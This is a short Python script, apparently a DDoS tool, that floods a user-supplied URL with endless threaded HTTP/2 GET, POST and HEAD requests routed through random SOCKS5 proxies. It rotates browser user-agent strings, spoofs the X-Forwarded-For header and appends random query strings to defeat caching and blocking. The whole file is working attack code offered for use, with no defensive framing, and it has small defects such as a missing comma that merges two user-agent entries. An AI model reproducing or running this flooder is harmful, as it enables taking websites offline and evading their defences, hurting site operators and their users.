#http2flood with socks5 list
import httpx
import threading
import random
site = input('url(https://example.org/): ')
Proxfile = input('Proxyfile(example.txt): ')
Threads = input('Threads(dont put over 200 or you might lag): ')
users = [
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
'Mozilla/5.0 (Windows NT 10.0; rv:88.0) Gecko/20100101 Firefox/88.0',
'Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:88.0) Gecko/20100101 Firefox/88.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:88.0) Gecko/20100101 Firefox/88.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.3; rv:88.0) Gecko/20100101 Firefox/88.0',
'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
'Mozilla/5.0 (X11; Linux i686; rv:88.0) Gecko/20100101 Firefox/88.0',
'Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
'Mozilla/5.0 (Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
'Mozilla/5.0 (X11; Linux i686; rv:88.0) Gecko/20100101 Firefox/88.0',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/33.0 Mobile/15E148 Safari/605.1.15',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/33.0 Mobile/15E148 Safari/605.1.15',
'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) FxiOS/7.5b3349 Mobile/14F89 Safari/603.2.4',
'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) FxiOS/7.5b3349 Mobile/14F89 Safari/603.2.4',
'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) FxiOS/7.5b3349 Mobile/14F89 Safari/603.2.4',
'Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:88.0) Gecko/88.0 Firefox/88.0',
'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0',
'Mozilla/5.0 (Android 11; Mobile; rv:88.0) Gecko/88.0 Firefox/88.0',
'Mozilla/5.0 (Android 11; Mobile; rv:87.0) Gecko/87.0 Firefox/87.0',
'Mozilla/5.0 (Android 11; Mobile; rv:85.0) Gecko/85.0 Firefox/85.0'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4820.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.4.727 Yowser/2.5 Safari/537.36',
'Mozilla/5.0 (X11; CrOS x86_64 14268.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.111 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.62'
]
def main():
    Proxy = random.choice(list(open(Proxfile)))
    proxies = {'http://': 'socks5://'+Proxy}
    headers = {'Upgrade-Insecure-Requests':'1','Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.5','user-agent':random.choice(users), 'Cache-Control': 'no-cache','Prama': 'no-cache', 'X-Forwarded-For': Proxy, 'Connection': 'Keep-Alive','X-Requested-With': 'XMLHttpRequest'}
    with httpx.Client(http2=True, headers=headers,proxies=proxies,timeout=3.0) as client:
            try:
                abc = site +"?="+ str(random.randint(1,1000))+"="+str(random.randint(1,1000))
                r = client.get(abc)
                r = client.get(abc)
                r = client.post(abc)
                r = client.head(abc)
                print(r.status_code,r.http_version,Proxy)
            except:
                print("dead proxy")
while 1:
    for i in range(int(Threads)):
        t = threading.Thread(target=main)
        t.start()
